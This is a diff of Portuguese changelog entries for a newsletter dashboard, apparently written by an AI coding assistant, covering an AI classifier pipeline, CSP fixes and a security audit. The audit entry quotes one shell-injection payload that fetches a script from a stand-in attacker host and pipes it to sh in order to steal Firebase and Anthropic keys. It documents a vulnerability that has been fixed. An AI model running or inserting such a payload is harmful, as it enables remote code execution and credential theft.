@@ -6,6 +6,290 @@ Todas as mudanças relevantes do sistema. Formato baseado em [Keep a Changelog](
 
 ---
 
+## [4.49.45+20260519-regression-defensiveness] — 2026-05-19
+
+Release **PATCH** — regression review após o sprint do shadow mode +
+security audit. Resposta ao Renê: "vc testou se tudo isso nao prejudicou
+alguma funcionalidade do sistema? da ultima vez travou o login..."
+
+**Verificações executadas** (8 chapters):
+1. `node --check` em 5 módulos críticos: OK
+2. Imports de `nlPerformance.js` resolvidos (6/6 found)
+3. `store.isMaster()` (line 244) e `store.can()` (line 146) confirmados
+4. `firestore.rules`: braces balanceadas (226=226), 106 match blocks,
+   `users`/`roles` intactos, 3 collections novas presentes
+5. CSP diff: SÓ adicionou hosts SFMC BU CDN, nada removido
+6. `seedDefaultAgents`: try/catch por seed isola falhas
+7. `MODULE_REGISTRY` tem fallback `|| a.module` no aiHub:180
+8. Test harness: 61/61 passou após refactor de segurança
+
+**1 risco real encontrado + blindado**: `renderShadowModeBlock` era
+chamado dentro de template literal sem try/catch local. Se exception
+interna fosse lançada (ex: regra Firestore não deployada), o
+`root.innerHTML` inteiro falharia → aba "Conteúdo & Temas" mostraria
+nada. Fix em 2 camadas: IIFE try/catch no template wrap +
+`.catch()` em `wireShadowModeDrill()` async.
+
+**Login verificado intacto** — js/auth/auth.js: 0 mudanças hoje.
+firestore.rules `/users/` e `/roles/`: 0 mudanças.
+
+---
+
+## [4.49.44+20260519-security-audit-fixes] — 2026-05-19
+
+Release **PATCH** — auditoria de segurança bank-grade do sprint.
+Resposta ao Renê: "acho prudente fazer uma auditoria em segurança pra
+cobrir possiveis, com nivel de exigencia de um banco".
+
+Findings: **2 CRITICAL + 2 HIGH + 3 MEDIUM** (operacionais).
+
+🔴 **CRITICAL #1 — Firestore rules ausentes** pra
+`nl_ai_classifier_runs / promotions / rollbacks`. Default-deny travaria
+sparkline. Fix: regras append-only via Admin SDK.
+
+🔴 **CRITICAL #6 — Shell injection em 3 workflows** via inputs
+`limit`/`since`/`confirmar` interpolados em bash. Vetor:
+`since=$(curl evil.com/payload.sh | sh)` → exfiltração de
+`FIREBASE_PRIVATE_KEY` e `ANTHROPIC_API_KEY`. Fix em 4 camadas: inputs
+via env vars, `set -euo pipefail`, allowlist regex, bash arrays.
+
+🟠 **HIGH #2 — Decision buttons sem gate de permissão**. Fix:
+`canVoteOnDecisions` gate na UI + defesa em profundidade no handler.
+
+🟠 **HIGH #5 — Workflows sem `permissions:` explícito**. Fix:
+`permissions: contents: read` (least-privilege).
+
+🟡 **MEDIUM abertos** (documentados em `SECURITY-AUDIT-2026-05-19.md`):
+PII em htmlText (→ DPA Anthropic), prompt injection insider, pinning
+de actions `@v4` (sprint de governança separada).
+
+---
+
+## [4.49.43+20260519-nl-classifier-test-harness] — 2026-05-19
+
+Release **PATCH** — test harness pra `classify-content-ai.js`. Resposta
+ao Renê: "testou a operacao dele (sem ativar a API, apenas verificando
+se ele trabalha, de fato)?" — não tinha testado além de `node --check`.
+
+**Refatoração**: gate `IS_CLI` separa execução CLI de require pra
+testes. Exporta helpers puros (`parseClaudeJson`, `validateOutput`,
+`buildPayload`, `shouldClassify`, `agentVersion`, `estimateRunCostUsd`).
+
+**Test harness `classify-content-ai.test.js`** (61 testes em 8 áreas):
+parseClaudeJson (6), validateOutput (8), buildPayload (7), shouldClassify
+(5), agentVersion (5), estimateRunCostUsd (5), fluxo integrado
+parse+validate (4), E2E simulado (4).
+
+**Workflow CI** ganha step "Run smoke tests" ANTES da chamada Claude
+(falha rápido sem queimar tokens). Edge cases manuais validados: aspas
+curvas, emoji, resposta multi-linha com preface.
+
+Custo simulado por chamada: $0.0004 (cache hit 94%).
+
+---
+
+## [4.49.42+20260519-nl-classifier-pipeline-100pct] — 2026-05-19
+
+Release **MINOR** — pipeline 100% operacional do classificador IA.
+Resposta ao Renê: "faça o que tem de fazer pra ele funcionar 100%...
+quero o caminho que funciona 100%, com tudo que temos direito."
+
+**Reforços em `classify-content-ai.js`**: cost cap diário (lê
+`nl_ai_classifier_runs`, exit 2 se estourado), audit per-doc em
+`ai_usage_logs` (formato compatível com Cloud Function), exit codes
+semânticos (0=OK, 1=erro fatal, 2=budget estourado, 3=erro >20%).
+
+**NOVO — `promote-ai-to-prod.js` + workflow**: cutover idempotente com
+backup automático em `commercialPrev`. Filtro de confiança configurável.
+Workflow manual com confirmação literal "PROMOVER".
+
+**NOVO — `rollback-ai-classification.js` + workflow**: reverte cutover,
+defesa `missingBackup`, filtro `--since=<ISO>`. Workflow manual com
+confirmação "REVERTER".
+
+**Dashboard NL → Conteúdo & Temas → bloco shadow mode** ganha:
+sparkline da evolução temporal (3 linhas vs meta 90%), painel admin
+(3 botões pros workflows com semáforo), botões de decisão por
+divergência ("IA certa" / "regex certo" → grava em
+`extracted.humanDecisionCommercial/Tourism`).
+
+Concurrency lock em `classify-content-ai.yml`.
+
+---
+
+## [4.49.41+20260519-classificador-newsletters-shadow-mode] — 2026-05-19
+
+Release **MINOR** — shadow mode do agente Classificador NL. Pipeline:
+shadow → revisão humana → cutover → rollback. Resposta ao Renê: "quero
+o caminho da excelencia".
+
+**Princípio arquitetural**: cada agente vive no seu módulo (não há
+agentScheduler genérico). IA Hub = registry + governança; orquestração
+nativa do módulo.
+
+**`scripts/classify-content-ai.js`** (330 linhas): lê agente
+`nl-content-classifier` do Firestore (single source of truth — editar
+prompt no IA Hub propaga sem deploy), kill switch soft
+(`agent.active === false` → exit 0), idempotência por hash
+`model+systemPrompt`, chama Anthropic com `cache_control` (cache hit
+~10% do input), grava em campos paralelos `extracted.ai*` (NÃO toca
+em produção), concorrência 3 + backoff 429/5xx, resumo em
+`nl_ai_classifier_runs`.
+
+**Workflow `classify-content-ai.yml`**: cron `45 6 * * *` (15min depois
+do `classify-content.js` regex) + manual com dry/force/limit/verbose.
+
+**Dashboard shadow mode block**: empty state com checklist, KPIs com
+semáforo (≥90% verde), distribuição de confiança, tabelas top 10
+de divergências por eixo.
+
+**Doc**: `scripts/SHADOW-MODE-NL-CLASSIFIER.md` com arquitetura, setup,
+custo estimado, troubleshooting.
+
+---
+
+## [4.49.40+20260519-classificador-newsletters-claude-haiku] — 2026-05-19
+
+Release **PATCH** — seed do Classificador NL muda de Gemini para
+Anthropic Claude Haiku 4.5. Resposta ao Renê: "nao vou usar gemini.
+vou usar api claude".
+
+Provider/model atualizados. Code-path validado: `runAgent` pula
+validação de key local quando provider==='anthropic' → `callLLMSecure`
+→ Cloud Function `callLLM` → Secret Manager → `api.anthropic.com`.
+Prompt caching automático ≥1024 chars (nosso prompt tem ~7k → cache
+hit cobra ~10% do input).
+
+---
+
+## [4.49.39+20260519-agente-classificador-newsletters-seed] — 2026-05-19
+
+Release **PATCH** — agente-seed `nl-content-classifier` no IA Hub
+(DESATIVADO). Resposta ao Renê: "precisamos deixar ele pronto no IA
+Hub, mas sem ativá-lo ainda. faça algo criterioso, com o mesmo padrão
+que vc utilizou para fazer as categorizações".
+
+Novo seed em `SYSTEM_SEED_AGENTS` espelha 1:1 as regras de
+`scripts/classify-content.js`: prioridade `sazonal > promocao > parceiro
+> inspiracional` (Comercial) e `evento > aereo > roteiro > servico >
+hotelaria > cruzeiro > produto > outros > destino` (Turismo), trigger
+rule 1-match-subject OU 2+-match-htmlText, CSAT bypass, regra especial
+de BU (BTG/Centurion não vira "parceiro" só pela BU), 7 anti-padrões
+explícitos, 2 few-shot examples.
+
+Defaults conservadores: `temperature 0.1`, `maxTokens 512`, `rateLimit
+30/min`, `maxCostPerDayUsd 2`, `visibility admin`. Todos os 4 triggers
+desabilitados.
+
+Side fix: `'nl'` em `MODULE_REGISTRY` pro label "Newsletters" no card.
+
+---
+
+## [4.49.38+20260519-pdf-conteudo-rewrite] — 2026-05-19
+
+Release **PATCH** — rewrite do PDF de Newsletter → Conteúdo & Temas
+seguindo padrão visual do dashboard de Produtividade. Resposta ao Renê:
+"a exportacao para pdf ainda carece de melhorias. faltam graficos,
+padronizacao, retirada de caracteres especiais...".
+
+**Antes**: `jsPDF` cru sem `pdfKit`, títulos com emojis (💼 ✈️ 🌍 —
+viram caixinhas no Helvetica/WinAnsi), sem capa/footer/gráficos, 7
+tabelas empilhadas em retrato.
+
+**Agora** (landscape, espelha Produtividade): capa branded, KPI strip
+de 6 blocos com semáforo, **8 gráficos de barras horizontais nativas**
+em grade 2×4 (Comercial × Turismo / Países × Cidades / Hotéis × Marcas
+/ Cruzeiros × Temas), tabela final com pintura semafórica, footer
+paginado, sanitização total (`txt()` + `stripEmoji()`), `withExportGuard`.
+
+---
+
+## [4.49.37+20260519-csp-libera-todas-bus-sfmc] — 2026-05-19
+
+Release **PATCH** — CSP `img-src` libera as 5 CDNs SFMC BU completas.
+Resposta ao Renê: "U0225, U0224, P0224, P0220, U0223, P0222... está
+percebendo o padrão?"
+
+**Diagnóstico real**: Firestore tinha `imageUrls=5` em todos os 6 docs
+reportados. Falha era CSP — só liberava `image.viagens.newsletterprime.com.br`.
+Faltavam 4 CDNs: `partnersbtgpactual.com.br`, `ultrabtgpactual.tur.br`,
+`mktpts.tur.br`, `centurion.mktpts.tur.br`.
+
+Padrão de erro registrado: "funcionou pra mim => liberei só o que
+testei". **Validação live**: modal U0225 com 5/5 imagens carregadas.
+
+---
+
+## [4.49.36+20260519-fix-merge-waves-imageurls] — 2026-05-19
+
+Release **PATCH** — fix do merge de waves: `imageUrls` passa a vir de
+QUALQUER wave do grupo, não só do `base` alfabeticamente. Resposta ao
+Renê: "tem a ver com o disparo ter feito em ondas e vc condensar em
+um resultado só?" (acertou em cheio).
+
+**Diagnóstico**: `dedupContentByCampaign` + `mergeWaves` em
+`nlPerformance.js` consolidavam waves (P0209_1/_2/_3 = 1 campanha)
+pegando o `base` alfabético. Se P0209_1 não tinha `imageUrls` e P0209_2
+tinha 5, o merge cuspia o doc do _1 → modal sem imagens.
+
+Fix: `const waveWithImgs = group.find(d => Array.isArray(d.imageUrls)
+&& d.imageUrls.length > 0); const mergedImageUrls = waveWithImgs?.imageUrls
+|| base.imageUrls || [];`
+
+---
+
+## [4.49.35+20260519-desacopla-ia-mc-sync] — 2026-05-19
+
+Release **MAJOR** (arquitetural) — desacopla IA do workflow de sync.
+Resposta ao Renê: "o que tem a ver IA com o sync?"
+
+`mc-sync.js` chamava `extractEntitiesViaAgent` em loop → quota Gemini
+estourava no meio da sync → retry loop infinito → timeout 15min do
+workflow → sync parou em 06/05 (gap 07/05 → 19/05).
+
+**Fix arquitetural**: cada workflow com 1 responsabilidade.
+- `mc-sync.js`: SÓ sincroniza performance + extrai imagens (zero IA)
+- `enrich-content.js`: enriquecimento determinístico (dicionário curado)
+- `classify-content.js`: classificação dupla por regex
+- `extractEntitiesViaAgent`: wrapped em `if (false && ...)` dead-code
+
+Cada feature ganha seu próprio workflow + cron. Falhas isoladas.
+
+---
+
+## [4.49.34+20260519-circuit-breaker-gemini] — 2026-05-19
+
+Release **PATCH** — circuit breaker contra quota Gemini estourada no
+mc-sync (mitigação imediata enquanto v4.49.35 desacoplava por completo).
+
+Após N falhas consecutivas de quota, desativa chamadas IA até o final
+da run e termina com warning em vez de timeout.
+
+---
+
+## [4.49.33+20260519-nl-ui-no-art-honest-contexto] — 2026-05-19
+
+Release **PATCH** — UI honesta para docs sem `imageUrls` no modal
+"Ver arte". Em vez de "imagem indisponível" genérico, mostra contexto
+por `noArtReason`: csat (📋 pesquisa), warmup (🔥 warm-up), test
+(🧪 teste interno), pending (⚠ asset deletado/sem html).
+
+---
+
+## [4.49.32+20260519-categorize-no-art-100pct] — 2026-05-19
+
+Release **MINOR** — 3 itens completados: (1) bloco "Tipo de newsletter
+(legado)" REMOVIDO do dashboard (redundante após v4.49.27), exports
+XLS/PPT também limpos. (2) Tooltips ilegíveis viraram modal estruturado
+(`INFO_MODAL_DEFINITIONS` com categorias/prioridade/exemplos).
+(3) `scripts/categorize-no-art.js` categoriza os 64 docs sem
+`imageUrls` (55 marcados csat/warmup/test, 9 pending por asset deletado).
+
+Resposta ao Renê: "trabalho com excelencia... 100% das imagens das
+news, e nao 90%".
+
+---
+
 ## [4.49.31+20260519-csp-img-src-sfmc] — 2026-05-19
 
 Release **PATCH** — bugfix do v4.49.30: backfill funcionou (692 docs com
